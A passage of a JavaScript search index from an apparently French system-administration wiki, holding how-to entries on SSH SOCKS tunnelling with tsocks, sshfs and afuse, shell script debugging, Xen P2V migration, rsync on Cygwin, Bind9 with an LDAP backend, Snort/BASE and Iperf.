                content: "Installation linkFor what follows, I’ll base this on a standard Kubuntu 7.10 installation. We’ll need the following packages:\nsshfs tsocks afuse If you choose to use aptitude for your installation, proceed as follows:\nsudo aptitude install fuse tsocks afuse The installation shouldn’t pose any insurmountable problems, so I won’t elaborate further on this subject.\nHowever, you must ensure that your user (in my case deimos) belongs to the fuse group:\ndeimos@deimos-desktop:~$ id -a uid=1000(deimos) gid=1000(deimos) groups=4(adm),20(dialout),...106(fuse),108(lpadmin),...1000(deimos) If this is not the case, you can add the user with the following command:\ndeimos@deimos-desktop:~$ sudo usermod -G fuse deimos or\ndeimos@deimos-desktop:~$ adduser deimos fuse Be sure to log out/log in if you’re in a graphical session to apply this group change. You’ll also need to restart your terminal if you’re SSH’ed into your machine. Otherwise, you can use this command if you don’t want to log out:\nnewgrp fuse Setting Up linkThe first step is to set up our means of communication with the bouncer server, particularly setting up authentication keys. To do this, we’ll use authentication keys that we’ll deposit in the appropriate directory of the bouncer server user:\nGenerating the Key link deimos@deimos-desktop:~$ ssh-keygen -t dsa Generating public/private dsa key pair. Enter file in which to save the key (/home/deimos/.ssh/id_dsa): Enter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in /home/deimos/.ssh/id_dsa. Your public key has been saved in /home/deimos/.ssh/id_dsa.pub. The key fingerprint is: a9:xx:7d:xx:d9:xx:ea:xx:bd:xx:66:xx:98:xx:47:xx deimos@deimos-desktop Depositing the Key on the Bouncer Server link deimos@deimos-desktop:~$ cat .ssh/id_dsa.pub | ssh deimos@rebond \"cat \u003e\u003e /home/deimos/.ssh/authorized_keys\" The authenticity of host 'rebond (xx.xx.xx.xx)' can't be established. RSA key fingerprint is 78:xx:ab:xx:d7:xx:26:xx:49:xx:ec:xx:aa:xx:47:xx. Are you sure you want to continue connecting (yes/no)? yes Warning: Permanently added 'rebond' (RSA) to the list of known hosts. deimos@rebond's password: Alternatively, on Debian, you can use this command:\nssh-copy-id deimos@rebond We’re copying the content of the public key we just generated into the list of keys authorized to connect to my account on the bouncer server. Thus, the next time we try to connect to the bouncer machine, I won’t have to enter a password:\ndeimos@deimos-desktop:~$ ssh deimos@rebond Last login: Wed Mar 5 09:21:35 2008 from xx.xx.xx.xx Authorized uses only. All activity may be monitored and reported. deimos@rebond# Creating an SSHFS Mount Point link deimos@deimos-desktop:~$ mkdir test deimos@deimos-desktop:~$ sshfs deimos@rebond:/tmp test deimos@deimos-desktop:~$ ls test croxxLa crxxLa getxxxt psxxta crouxxiLa get_xxp lxxe croxxiLa gexxxt PPCxx303 Looks like it’s working!\nAccessing Our Servers via Bouncer Server linkWe have now configured a connection to our bouncer server and we can even mount the file system via SSH from the bouncer server locally. The problem is, if we need to access servers behind the bouncer server, we are forced to reconnect to the latter each time to launch the connection:\ndeimos@deimos-desktop:~$ ssh -o ConnectTimeout=2 deimos@host-dmz1 ssh: connect to host host-dmz1 port 22: Connection timed out It’s impossible to connect directly to the host-dmz1 server\ndeimos@deimos-desktop:~$ ssh deimos@rebond Last login: Wed Mar 5 09:45:36 2008 from 10.251.100.134 yperre@rebond#ssh deimos@host-dmz1 deimos@host-dmz1's password: This kind of thing leads to several disadvantages:\nMultiplication of connections on the bouncer machine Loss of time and multiplication of operations to connect to your machines. When you have a park of 200 machines to manage, you don’t necessarily want to reconnect 50 times a day. The idea is therefore to reuse the same connection all the time to transit your connections to the DMZ. To do this, we’ll use SSH tunnels, particularly the allocation of dynamic connections (option -D).\nTo do this, let’s restart our connection to the bouncer server by adding the ‘-D 8888’ option to create a dynamic port on port 8888 (the dynamic port is actually seen as a SOCKS server):\ndeimos@deimos-desktop:~$ ssh -D 8888 deimos@rebond Could not request local forwarding. Last login: Wed Mar 5 09:48:38 2008 from 10.251.100.134 deimos@rebond# Note, if you see the following lines:\nbind: Address already in use channel_setup_fwd_listener: cannot listen to port: 8888 You have 2 possibilities:\nYou already have an open connection with a tunnel You have a local program that uses port 8888 =\u003e Change it! Note: From now on, I’ll talk about SOCKS server rather than dynamic port.\nAll that is good, but SSH can’t use a SOCKS server to connect to our servers. We’ll need to find another solution: a ‘socksifying’ library (phew!)\nYou have the choice between dante-client and tsocks. My choice fell on tsocks because of its simplicity, but what follows is perfectly usable under dante!\nAs we saw above, tsocks (under *Ubuntu) is simply installed via the packaging system. By default, it will offer you a configuration file /etc/tsocks.conf. I suggest you modify it as follows:\ndeimos@deimos-desktop:~$ cat /etc/tsocks.conf # server = 127.0.0.1 # Server type defaults to 4 so we need to specify it as 5 for this one server_type = 5 # The port defaults to 1080 but I've stated it here for clarity server_port = 8888 Now we just need to socksify our SSH calls and voila:\ndeimos@deimos-desktop:~$ LD_PRELOAD=/usr/lib/libtsocks.so ssh deimos@host-dmz1 deimos@host-dmz1's password: We are now able to access our DMZ server directly from our workstation. Now let’s try to combine this with an SSHFS mount encapsulated in an SSH tunnel:\ndeimos@deimos-desktop:~$ LD_PRELOAD=/usr/lib/libtsocks.so sshfs deimos@host-dmz1:/usr/local/lib test deimos@deimos-desktop:~$ ls test libcharset.a libgcc_s.so.1 libpopt.la libcharset.la libiconv.la libpopt.so libcharset.so libiconv.so libpopt.so.0 libcharset.so.1 libiconv.so.2 libpopt.so.0.0.0 libcharset.so.1.0.0 libiconv.so.2.4.0 libstdc++.a libg2c.a libintl.a libstdc++.la libg2c.la libintl.la libstdc++.so libg2c.so libintl.so libstdc++.so.6 libg2c.so.0 libintl.so.3 libstdc++.so.6.0.3 libg2c.so.0.0.0 libintl.so.3.4.0 preloadable_libiconv.so libgcc_s.so libpopt.a And there we have it, we have direct access locally, in a transparent way, to our files on the DMZ machine. From there, it’s entirely possible to copy our files from one server to another by relying on these mount points.\nYou might say that’s already a pretty good situation, but unfortunately I have to tell you that we can do even better: the use of a fuse automount!\nAutomount with FUSE linkSo far, we’ve seen the following points:\nUsing a bouncer server Exchange of private/public keys Mounting a file system using the SSH protocol Connecting to a server through a SOCKS server/tunnel/dynamic port Connecting a file system by using a SOCKS server. We will now focus on mounting partitions automatically using afuse.\nTo do this, we’ll run a command that will take an SSHFS mount template as a parameter.\nHere’s the command in question:\nafuse -f -o \\ mount_template=\"LD_PRELOAD=/usr/lib/libtsocks.so sshfs deimos@%r:/ %m\" -o \\ unmount_template=\"fusermount -u -z %m\" ~/sshfs Note that this command will block your terminal. If you wish to run it as a daemon, you’ll need to precede it with the nohup command as well as ‘\u0026’ to run it in the background.\nAnother important note, if you’re using a recent distribution (*ubuntu, debian, mandriva, etc), your distribution will certainly use UTF8 encoding. If you’re using an old Unix/proprietary Unix (Solaris 8, AIX 5.x etc), you’ll probably have an ISO8859-1 type encoding. You’ll probably need to specify the option ‘-o from_code=ISO8859-1’.\nLet’s look at the result:\ndeimos@deimos-desktop:~$ cd sshfs/ deimos@deimos-desktop:~/sshfs$ ls deimos@deimos-desktop:~/sshfs$ cd host-dmz1 deimos@deimos-desktop:~/sshfs/host-dmz1$ ls bin cdrom etc initrd lib media opt root srv tmp var boot dev home initrd.img lost+found mnt proc sbin sys usr vmlinuz deimos@deimos-desktop:~/sshfs/host-dmz1$ cd .. deimos@deimos-desktop:~/sshfs$ ls host-dmz1 deimos@deimos-desktop:~/sshfs$ cd recette-dmz1 deimos@deimos-desktop:~/sshfs/recette-dmz1$ ls 1 dead.letter HDS lost+found proc root 11 dev home mnt prod sbin devices kernel mnt2 doc legal noautoshutdown bin etc lib opt var usr LICENSE.txt platform deimos@deimos-desktop:~/sshfs/recette-dmz1$ cd .. deimos@deimos-desktop:~/sshfs$ ls host-dmz1 recette-dmz1 You are now able to transparently copy between 2 machines that may be on 2 different DMZs from your workstation (or even editing this with emacs or other kate and vi) and all this in a completely transparent way while facilitating access to your DMZ machines.\nThe security guys will be pleased!\nResources linkhttp://linuxfr.org/2008/03/07/23807.html\nhttp://ensl.free.fr/softrez/faq/faq-9.html#ss9.1\n"
            }
        );
    index.add(
            {
                id:  677 ,
                href: "\/Debugger_un_script_shell\/",
                title: "Debugging a Shell Script",
                description: "How to debug shell scripts using built-in options like -v and -x to trace execution and understand script behavior.",
                content: "Shell scripts are often criticized for not having an integrated debugger. But this is false!\nWhen programming in bash, there are command line options to see what is being read and then executed in a script.\nExample linkLet’s say we have the script MyScript.sh:\n#!/bin/sh touch unFichier if [ -f ./unFichier ]; then rm ./unFichier fi If we execute it this way:\n/bin/bash -v -x ./MyScript.sh We’ll get output like this:\n#!/bin/sh touch unFichier + touch unFichier if [ -f ./unFichier ]; then rm ./unFichier fi + '['-f ./unFichier ']' + rm ./unFichier The normal lines are the lines and blocks that are read, while those with a + in front are the ones being executed.\n"
            }
        );
    index.add(
            {
                id:  678 ,
                href: "\/Xen_convertion_P2V\/",
                title: "Xen Conversion P2V",
                description: "Guide on how to convert a physical server to a Xen virtual machine through P2V conversion process.",
                content: "1 Introduction linkHow to remedy the physical deterioration of a server (oldpc) by migrating the OS into a brand new Xen HVM domU.\n2 Preparing space for oldpc on the xen server linkCreate a disk image (20 GB size):\ndd if=/dev/zero of=/vieuxpc/vieuxpc.hda.img bs=1024k count=20000 Create a loop device corresponding to the entire disk image:\nlosetup /dev/loop0 /vieuxpc/vieuxpc.hda.img Partition the image:\nfdisk /dev/loop0 List the created partitions:\nfdisk -ul /dev/loop0 Disk /dev/loop0: 20.9 GB, 20971520000 bytes 255 heads, 63 sectors/track, 2549 cylinders, total 40960000 sectors Units = sectors of 1 * 512 = 512 bytes Device Boot Start End Blocks Id System /dev/loop0p1 63 17591174 8795556 83 Linux /dev/loop0p2 17591175 19567169 987997+ 82 Linux swap / Solaris Attach the partitions as loop devices:\nlosetup -o $((63*512)) /dev/loop1 /vieuxpc/vieuxpc.hda.img losetup -o $((17591175*512)) /dev/loop2 /vieuxpc/vieuxpc.hda.img Format: (note that 8795556 is the number of blocks as displayed by fdisk)\nmkfs.ext3 /dev/loop1 8795556 mkswap /dev/loop2 987997 3 Copy the data from oldpc linkMount the root partition of oldpc and copy the data:\nmount /dev/loop0 /target mount /dev/sdc2 /source cd /source tar cf - . | ( cd /target/ \u0026\u0026 tar xf -) Edit /source/boot/grub/menu.lst to match your partition scheme:\nroot (hd0,0) kernel /boot/vmlinuz-2.6.18-5-486 root=/dev/hda1 ro initrd /boot/initrd.img-2.6.18-5-486 Unmount everything:\numount /target umount /source losetup -d /dev/loop{0,1,2} 4 Install the bootloader linkInstall GRUB on the disk using a GRUB rescue floppy:\ncat /usr/lib/grub/stage[12] \u003e floppy.img Note: Debian users can install grub-disk, a bootable GRUB image preconfigured to boot many operating systems.\nqemu -fda floppy.img -hda /vieuxpc/vieuxpc.hda.img -boot a GNU GRUB version 0.95 (639K lower / 31744K upper memory) [ Minimal BASH-like line editing is supported. For the first word, TAB lists possible command completions. Anywhere else TAB lists the possible completions of a device/filename. ] grub\u003e root (hd0,0) Filesystem type is ext2fs, partition type 0x83 grub\u003e setup (hd0) Checking if \"/boot/grub/stage1\" exists... yes Checking if \"/boot/grub/stage2\" exists... yes Checking if \"/boot/grub/e2fs_stage1_5\" exists... no Running \"install /boot/grub/stage1 (hd0) /boot/grub/stage2 p /boot/grub/menu.lst \"... succeeded Done. grub\u003e 5 Test and put into production linkTest everything with qemu:\nqemu -hda /vieuxpc/vieuxpc.hda.img Create the Xen-hvm configuration file (see http://wiki.gcu.info/doku.php?id=unix:xen_hvm for example):\nname=\"vieuxpc\" kernel = \"/usr/lib/xen/boot/hvmloader\" builder = \"hvm\" vif=['type=ioemu, mac=00:16:3E:00:03:05, bridge=xenbr0'] disk = [ 'file:/vieuxpc/vieuxpc.hda.img,ioemu:hda,w' ] device_model = \"/usr/lib/xen/bin/qemu-dm\" dhcp=\"dhcp\" memory=\"256\" on_poweroff = 'destroy' on_reboot = 'restart' on_crash = 'restart' vnc=1 On first boot, reconfigure the network interface, since the physical interface obviously no longer exists. Instead, you have an emulated ne2000 network card.\n"
            }
        );
    index.add(
            {
                id:  679 ,
                href: "\/Installer_Rsync_sur_Windows\/",
                title: "Installing Rsync on Windows",
                description: "A guide on how to install and configure Rsync on Windows using Cygwin, including SSH setup and BackupPC configuration.",
                content: "Installing Cygwin on Windows linkDownload: https://www.cygwin.com/\nDuring installation, choose a download site in France (if available).\nPackages to install: rsync, openssh, and cygwin (cygrunsrv, cygwin)\nAdding a System Variable on Windows (in Environment Variables) link variable: CYGWIN value: ntsec tty And add to the end of the path: c:\\cygwin\\bin\nConfiguring sshd on Cygwin linkExecute:\nssh-host-config Answer “yes” to all questions and set a password when prompted.\nExecute the sshd service:\ncygrunsrv -S sshd To verify it’s working, try a local telnet connection on port 22. You can also check if the sshd service has been added to Windows services.\nScript for BackupPC link $Conf{XferMethod} = 'rsync'; $Conf{RsyncShareName} = [ '/cygdrive/c/Shoreline Data' ]; $Conf{RsyncUserName} = 'administrateur'; $Conf{BlackoutPeriods} = [ { 'hourEnd' =\u003e '19.5', 'weekDays' =\u003e [ '1', '2', '3', '4', '5' ], 'hourBegin' =\u003e '7' } ]; $Conf{FullPeriod} = '30'; $Conf{FullKeepCnt} = [ '6', '0', '1' ]; $Conf{IncrAgeMax} = '30'; $Conf{IncrKeepCntMin} = '1'; $Conf{RsyncClientCmd} = '$sshPath -q -x -l Administrateur $host $rsyncPath $argList+'; $Conf{RsyncClientRestoreCmd} = '$sshPath -q -x -l Administrateur $host $rsyncPath $argList+'; "
            }
        );
    index.add(
            {
                id:  680 ,
                href: "\/altermime-ajouter-automatiquement-un-disclamer-sur-les-emails-sortants\/",
                title: "AlterMIME: Automatically Add a Disclaimer to Outgoing Emails",
                description: "Documentation on how to automatically add disclaimers to your outgoing emails using AlterMIME",
                content: "Here is documentation that explains how to add a disclaimer text to the end of your outgoing emails:\nDocumentation on AlterMIME\nDocumentation on AlterMIME (Fedora)\n"
            }
        );
    index.add(
            {
                id:  681 ,
                href: "\/Mise_en_place_d\u0027un_serveur_Bind_en_backend_LDAP\/",
                title: "Setting up a Bind server with LDAP backend",
                description: "This guide explains how to configure a Bind9 DNS server with LDAP backend storage instead of text files, providing dynamic updates and centralized configuration.",
                content: "Introduction linkThis document explains the configuration of a Bind9 server as master but with storage in an LDAP server rather than in a text file.\nFor this, we need to use the sdb-ldap patch from https://www.venaas.no/ldap/bind-sdb/ for Bind9. FreeBSD includes a port where the patch is directly applied to Bind9 and you just need to install it like any other port.\nOn Debian, you’ll need to use apt-get source bind9 and then apply the patch manually.\nIn the rest of this document, everything will be based on FreeBSD.\nPrerequisites linkYou’ll need to have a functional LDAP server. For this, if you want to use OpenLDAP slapd, you can follow this document: Standard SLAPD Configuration\nFor Bind9, I installed the bind9-sdb-ldap port with WITH_PORT_REPLACES_BASE_BIND9=yes to replace the system’s Bind9.\nThe named.conf file linkThe file will be quite similar to the one in this document: Bind9 master configuration. The options and logging sections will be the same. Only the zone declaration changes.\nIt will be in the following form:\n// A standard zone zone \"deimos.fr\" { type master; database \"ldap ldap://127.0.0.1/ou=deimos.fr,ou=dns,o=deimos,dc=fr???? \\ !bindname=cn=dnsadmin%2cou=dns%2co=deimos%2cdc=fr,!x-bindpw=DnsPassword 172800\"; notify yes; }; // A reverse zone zone \"1.168.192.in-addr.arpa\" { type master; database \"ldap ldap://127.0.0.1/ou=1.168.192.in-addr.arpa,ou=dns,o=deimos,dc=fr???? \\ !bindname=cn=dnsadmin%2cou=dns%2co=deimos%2cdc=fr,!x-bindpw=DnsPassword 172800\"; notify yes; }; We can see that we have a database line that defines access to LDAP rather than the line indicating where the text file is located in a standard configuration.\nIf we analyze this line, we see:\ndatabase: indicates that we are using a database-type storage ldap indicates that it’s LDAP ldap://127.0.0.1/ represents the server to connect to ou=deimos.fr,ou=dns,o=deimos,dc=fr indicates the DN where all DNS-related information is stored !bindname=cn=dnsadmin%2cou=dns%2co=deimos%2cdc=fr represents the DN used to connect to the LDAP server. Note that commas are replaced by their code “%2c”. x-bindpw=DnsPassword is the password associated with the DN With this, our Bind server will know where and how to fetch information from our LDAP server.\nThe slapd.conf file linkThere will be few modifications to make to the slapd configuration.\nHere is an excerpt from the configuration file:\n[...] # We add support for DNS attributes and objectclass include /usr/local/etc/openldap/schema/dnszone.schema [...] # We add indexing of DNS-related parameters index relativeDomainName eq index zoneName eq [...] # We add a special user to browse this branch of the tree # DNS admin ACL access to dn.subtree=\"ou=dns,o=deimos,dc=fr\" by dn.regex=\"cn=dnsadmin,ou=dns,o=deimos,dc=fr\" write by * auth Don’t forget to restart your slapd daemon for these changes to take effect.\nLDAP directory additions linkNow we’ll look at what to add to our LDAP directory for our DNS to work properly.\nFor all manipulations with LDAP client commands, all LDIF files should be added using the ldapadd command.\nA container for all DNS configurations linkWe’re going to create a branch in the tree to put all the DNS server configurations.\nThe LDIF will be as follows:\ndn: ou=dns,o=deimos,dc=fr objectClass: top objectClass: organizationalUnit ou: dns description: All informations about DNS The dnsadmin user linkIn the slapd configuration file, we added a dnsadmin user.\nHere is its LDIF file:\ndn: cn=dnsadmin,ou=dns,o=deimos,dc=fr objectClass: top objectClass: person userPassword: {SSHA}J8+mJREWzYkFDmXnZCTalBbQhq17xUzj cn: dnsadmin sn: dnsadmin user A container for the deimos.fr zone linkNow we’ll add a branch to store all configurations related to the deimos.fr zone.\nThe LDIF will be as follows:\ndn: ou=deimos.fr,ou=dns,o=deimos,dc=fr objectClass: top objectClass: organizationalUnit ou: deimos.fr description: All informations about deimos.fr zone Declaration of the deimos.fr zone linkNow, we can declare the deimos.fr zone in the LDAP tree, using our corresponding branch that we just created.\nThe LDIF will be as follows:\ndn: zoneName=deimos.fr,ou=deimos.fr,ou=dns,o=deimos,dc=fr objectClass: top objectClass: dNSZone zoneName: deimos.fr relativeDomainName: deimos.fr Our Bind9 server will now have a correspondence with what we defined in its configuration file.\nThe SOA of the deimos.fr zone linkThis information corresponds to the beginning of a zone configuration file. It includes information about the various TTLs, the DNS servers of the zone, MX servers, etc.\nThe LDIF will be as follows:\ndn: relativeDomainName=@,ou=deimos.fr,ou=dns,o=deimos,dc=fr objectClass: top objectClass: dNSZone zoneName: deimos.fr relativeDomainName: @ dNSTTL: 3600 dNSClass: IN sOARecord: ns.deimos.fr. administrateur.deimos.fr. 2006112801 8H 2H 1W 1D nSRecord: ns.deimos.fr. mXRecord: 10 smtp.deimos.fr. aRecord: 192.168.1.250 tXTRecord: Zone_principale_deimos.fr The aRecord at the end corresponds to an entry that resolves the domain name if a type A query is done on it. The tXTRecord serves as a comment for reference… it’s not mandatory… but it’s always useful!\nDefinition of a type A record linkNow we’ll declare a machine with a type A record that simply associates a name with an IP address.\nThe LDIF will be as follows:\ndn: relativeDomainName=cordelia,ou=deimos.fr,ou=dns,o=deimos,dc=fr objectClass: top objectClass: dNSZone zoneName: deimos.fr relativeDomainName: orthosie dNSTTL: 1800 dNSClass: IN aRecord: 192.168.1.250 tXTRecord: Serveur_principal_applications The parameters speak for themselves - we just declared orthosie.deimos.fr, its IP address is 192.168.1.250. Same note on the tXTRecord, it’s always good for reference!\nDefinition of a CNAME type record linkNow we’ll declare a CNAME type record that simply associates a name with another existing name. This is commonly called an alias.\nThe LDIF will be as follows:\ndn: relativeDomainName=ns,ou=deimos.fr,ou=dns,o=deimos,dc=fr objectClass: top objectClass: dNSZone zoneName: deimos.fr relativeDomainName: ns dNSTTL: 1800 dNSClass: CNAME cNAMERecord: cordelia tXTRecord: Alias_pour_le_DNS The parameters are also self-explanatory here - we just declared ns.deimos.fr, its real name is orthosie.deimos.fr. I’ll skip the comment on the tXTRecord.\nA container for the 1.168.192.in-addr.arpa zone linkNow we’ll add a branch to store all configurations related to the 1.168.192.in-addr.arpa zone.\nThe LDIF will be as follows:\ndn: ou=1.168.192.in-addr.arpa,ou=dns,o=deimos,dc=fr objectClass: top objectClass: organizationalUnit ou: 1.168.192.in-addr.arpa description: All informations about 1.168.192.in-addr.arpa zone Declaration of the 1.168.192.in-addr.arpa zone linkNow we’ll declare the 1.168.192.in-addr.arpa zone in the LDAP tree, using our corresponding branch that we just created.\nThe LDIF will be as follows:\ndn: zoneName=1.168.192.in-addr.arpa,ou=1.168.192.in-addr.arpa,ou=dns,o=deimos,dc=fr objectClass: top objectClass: dNSZone zoneName: 1.168.192.in-addr.arpa relativeDomainName: 1.168.192.in-addr.arpa Our Bind9 server will now also have a correspondence with what we defined in its configuration file.\nDefinition of a PTR type record linkNow we’ll declare a PTR type record that simply associates an IP address with a name.\nThe LDIF will be as follows:\ndn: relativeDomainName=250,ou=1.168.192.in-addr.arpa,ou=dns,o=deimos,dc=fr objectClass: top objectClass: dNSZone zoneName: 1.168.192.in-addr.arpa relativeDomainName: 250 pTRRecord: cordelia.deimos.fr. tXTRecord: Serveur_principal_applications Once again, the parameters are self-explanatory. We’re associating 192.168.1.250 with the name orthosie.deimos.fr. Note the “.” at the end of the machine name, which indicates that it’s the end of the name, there’s nothing to concatenate after it.\nApplying the changes linkAll that remains is to restart the Bind9 daemon. To do this:\n# /etc/rc.d/named restart In the system logs, you should see Bind9 making queries to the LDAP server.\nFor additions of entries to already created zones, it’s dynamic! There’s no need to restart the Bind9 daemon.\nHowever, when creating a new zone, you do need to restart Bind.\nDaily administration linkTo facilitate the administration of all these entries in LDAP, you can use software like phpLDAPadmin, but personally, I don’t like it much…\nAlternatively, there are also some Perl scripts that I quickly wrote on a virtual desktop corner… You can find them here: LDAP Administration Scripts for DHCP/DNS daemons.\nConclusion linkOur DNS server is now configured with LDAP storage rather than text files.\nThe biggest advantage is that modifications are applied immediately without needing to restart. I’m sure we can find many other advantages… Centralized administration, etc.\nThe proper way to have a backup DNS server would be to configure another slapd in replication as explained in this document: SLAPD Configuration in Replication, then configure Bind on the machine in question to query the local LDAP server.\nOn both servers, Bind is configured as master!\nAnother point: dynamic zone updates are not possible because Bind doesn’t know how to write to the LDAP tree.\nResources linkhttps://www.free-4ever.net/index.php/Dns:configuration_bind9_backend_ldap\n"
            }
        );
    index.add(
            {
                id:  682 ,
                href: "\/PSAD_:_protection_contre_les_scans_de_type_nmap\/",
                title: "PSAD: Protection Against nmap-Type Scans",
                description: "Documentation on how to use PSAD for protecting systems against nmap-type scans, similar to Fail2Ban.",
                content: "Here is documentation in line with the Fail2Ban software. Here’s some brief documentation:\nDocumentation on PSAD\n"
            }
        );
    index.add(
            {
                id:  683 ,
                href: "\/Graver_en_ligne_de_commandes\/",
                title: "Command-line Burning",
                description: "Documentation explaining how to burn CDs and DVDs using command line tools, useful for automating backups.",
                content: "Here is documentation explaining how to burn CDs and DVDs using the command line. This is useful for automating backups, for example:\nDocumentation on CD/DVD burning and command line tools\n"
            }
        );
    index.add(
            {
                id:  684 ,
                href: "\/architecture-de-base-avec-asterisk-et-freephonie\/",
                title: "Basic Architecture with Asterisk and Freephonie",
                description: "Documentation on how to set up an Asterisk telephony server with Free clients",
                content: "Here is documentation on how to set up an Asterisk telephony server with Free clients:\nBasic Architecture with Asterisk and Freephonie Documentation\n"
            }
        );
    index.add(
            {
                id:  685 ,
                href: "\/Linux-Unix_cheat_sheets_-_The_ultimate_collection\/",
                title: "Linux-Unix Cheat Sheets - The Ultimate Collection",
                description: "A comprehensive collection of Linux and Unix command line reference sheets and resources for system administrators and developers.",
                content: "Linux Command Line Cheat Sheets link Linux reference card http://www.tuxfiles.org/linuxhelp/linuxcommands.html http://www.redhat.com/docs/manuals/linux/RHL-6.2-Manual/getting-started-guide/ch-doslinux.html http://theory.chem.umn.edu/~mayaan/command.html http://www.linuxhelp.net/guides/cheats/ The One Page Linux Manual Linux Security Quick Reference Guide LINUX System Call Quick Reference http://www.oreillynet.com/linux/cmd/ http://wiki.typo3.org/index.php/Linux_cheat_sheet "
            }
        );
    index.add(
            {
                id:  686 ,
                href: "\/Mise_en_place_de_Snort_%5C\u0026_BASE_%28Basic_Analysis_and_Security_Engine%29\/",
                title: "Setting up Snort \u0026 BASE (Basic Analysis and Security Engine)",
                description: "How to install and configure Snort IDS with BASE web interface for network intrusion detection on Debian systems",
                content: "Introduction linkSnort is what we call an IDS (Intrusion Detection System) and more specifically a passive NIDS (Network Intrusion Detection System). It can therefore detect who is trying to compromise your system.\nCurrently it’s not perfect, but it’s still less expensive than some IPS (Intrusion Prevention System). Snort coupled with BASE provides real convenience for intrusion detection.\nInstallation and configuration linkDocumentation on installing and configuring Base and Snort\nUsing Debian packages linkFor my part, I only followed a small portion since I used Debian packages directly (advantage of automatic updates). For those who want to take the same route:\napt-get install snort-mysql php5-gd libpcre3 acidbase python-adodb Explanations for beginners:\nSnort is the tool that will listen in promiscuous mode on one or more of your network cards and thus detect potential intrusion attempts BASE/AcidBase is the one that will read the results of Snort recorded in the SQL database (or other) It’s mentioned in the documentation, but for people like me who prefer to read between the lines, here’s the command to test your snort configuration:\nsnort -c /etc/snort/snort.conf FAQ linkBASE: Database ERROR: Table ‘snort.iphdr’ doesn’t exist linkIf you encounter this problem after an update or reinstallation, you just need to reimport an SQL file. Better practice than long explanations:\ncd /usr/share/doc/snort-mysql/ gzip -d create_mysql.gz mysql -uroot -pPASSWORD -D snort \u003c create_mysql That’s it! So it wasn’t really a big deal, and BASE is running again :-)\nResources link Another Documentation on Base and Snort Setting up Snort (IDS), OSSEC (HbIDS) and Prelude (HIDS) https://oinkmaster.sourceforge.net/ "
            }
        );
    index.add(
            {
                id:  687 ,
                href: "\/Iperf_:_Tester_sa_bande_passante_de_bout_en_bout\/",
                title: "Iperf: Testing End-to-End Bandwidth",
                description: "How to use Iperf to measure bandwidth and network performance between endpoints",
                content: "Iperf linkIperf is a computer software tool for measuring various variables of an IP network connection. Iperf is developed by the National Laboratory for Applied Network Research (NLANR). Based on a client/server architecture and available on different operating systems, Iperf is an important tool for network administrators.\nHow to Get It linkIperf is included in most Linux distributions by default. However, you can follow this link to download the version that corresponds to your operating system (Windows and MacOS X versions are also available).\nFor Debian / Ubuntu:\napt-get install iperf For Fedora:\nyum install iperf How Does Iperf Work? linkIperf must be run on two machines located at opposite ends of the network to be tested. The first machine runs Iperf in “server mode” (with the -s option), the second in “client mode” (with the -c option). By default, the network test is done using the TCP protocol (but it is also possible to use UDP mode with the -u option).\nHow to Use It linkLet’s take the example of a network test between machine A and machine B.\nOn machine A, run the following command:\n# iperf -s Then on machine B, run the command:\n# iperf -c The following result will be displayed:\n------------------------------------------------------------ Client connecting to 192.168.29.1, TCP port 5001 TCP window size: 65.0 KByte (default) ------------------------------------------------------------ [ 3] local 192.168.29.157 port 50675 connected with 192.168.29.1 port 5001 [ ID] Interval Transfer Bandwidth [ 3] 0.0-10.0 sec 110 MBytes 92.6 Mbits/sec This gives us the actual throughput between machine A and machine B. Using the -i option, we can get other types of information such as transit delay or network jitter.\nIt is possible to evaluate your Internet connection via a public Iperf server located on the Internet:\nHere are 3 suggested command lines for the server on Linux:\nTCP 5001: $ iperf -s -m -w 500K -i 5 TCP 4662: $ iperf -s -m -w 500K -i 5 -p 4662 UDP 5001: $ iperf -s -i 5 -u Here are 5 suggested command lines for the client on Linux:\nUpload only: $ iperf -c 212.27.33.25 -m -w 500K -i 5 -t 30 Upload + download: $ iperf -c 212.27.33.25 -m -w 500K -i 5 -t 30 -r Simultaneous upload + download: $ iperf -c 212.27.33.25 -m -w 500K -i 5 -t 30 -d -P 2 Upload + download on port 4662: $ iperf -c 212.27.33.25 -m -w 500K -i 5 -t 30 -p 4662 -r Upload + download in UDP at 80 Mb/s: $ iperf -c 212.27.33.25 -i 5 -t 30 -r -u -b 80M The -w parameter is very important; it specifies the “TCP window size” as the default value is too small. The window size value cannot exceed that of the operating system’s TCP/IP stack.\nIPERF in Multicast linkIperf can work in multicast mode (-B). Launch it as follows:\nOn the server:\n$ iperf -s -u -B 225.0.1.2 On the client:\n$ iperf -c 225.0.1.2 -u -b 3M This generates a UDP multicast stream (on address 225.0.1.2) of 3 Mb/sec.\nIPERF with Linux 2.6.21 and Later linkStarting with kernel 2.6.21, “The new high resolution timer option in the kernel causes usleep(0) to be a nop so the thread keeps running (until its quanta is exhausted).” =\u003e IPERF consumes much more CPU for the same throughput.\nOn a Pentium IV 2.8 GHz HT (bogomips = 5600):\nKernel 2.6.20: $ iperf -c 127.0.0.1 ------------------------------------------------------------ Client connecting to 127.0.0.1, TCP port 5001 TCP window size: 49.4 KByte (default) ------------------------------------------------------------ [ 3] local 127.0.0.1 port 54566 connected with 127.0.0.1 port 5001 [ 3] 0.0-10.0 sec 5.33 GBytes 4.58 Gbits/sec Kernel 2.6.22: $ iperf -c 127.0.0.1 ------------------------------------------------------------ Client connecting to 127.0.0.1, TCP port 5001 TCP window size: 49.4 KByte (default) ------------------------------------------------------------ [ 3] local 127.0.0.1 port 44642 connected with 127.0.0.1 port 5001 [ 3] 0.0-10.1 sec 273 MBytes 228 Mbits/sec A patch exists: http://dast.nlanr.net/Projects/Iperf2.0/patch-iperf-linux-2.6.21.txt\nA patched i686 binary is available: http://lafibre.info/images/iperf/iperf\nResources link Official website (in English) User manual and batch files for simple use under Windows (in French) "
            }
        );
    index.add(
            {
                id:  688 ,
                href: "\/Dkfilter_:_Proxy_SMTP_(signatures_mails)_made_by_Yahoo\/",
                title: "Dkfilter: Proxy SMTP (Signature Mails) Made by Yahoo",
                description: "A guide to set up DomainKeys for Postfix using dkfilter, a SMTP proxy for email signature verification and signing.",
